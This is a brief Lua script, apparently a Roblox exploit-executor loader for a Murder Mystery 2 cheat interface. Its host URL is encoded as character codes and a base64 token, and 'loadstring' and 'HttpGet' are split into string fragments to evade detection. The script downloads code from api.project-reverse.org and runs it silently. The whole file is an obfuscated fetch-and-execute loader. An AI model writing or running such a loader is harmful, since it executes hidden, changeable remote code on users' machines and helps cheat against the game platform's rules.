local _h = "\112\114\111\106\101\99\116\45\114\101\118\101\114\115\101\46\111\114\103"
local _b = "\97\112\105\46"
local _s = "\104\116\116\112\115\58\47\47"
local _r = "\47\114\117\110\47"
local _t = "eyJpZCI6ImVlZTg1YjI5LWYyNDItNDEwMS05ZDkxLTUwMjlhMDhmYWQxYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJuZXd1aSJ9fQ"

local _url = _s .. _b .. _h .. _r .. _t

local _f1 = _G["loa".."dstr".."ing"]
local _f2 = game["Ht".."tp".."G".."et"]

local _ok, _res = pcall(function()
    return _f2(_url)
end)

if _ok and _res then
    local _func, _err = _f1(_res)
    if _func then
        pcall(_func)
    else
        warn("Loadstring Error: " .. tostring(_err))
    end
else
    warn("HTTP Error. Server is down or blocking your executor.")
end
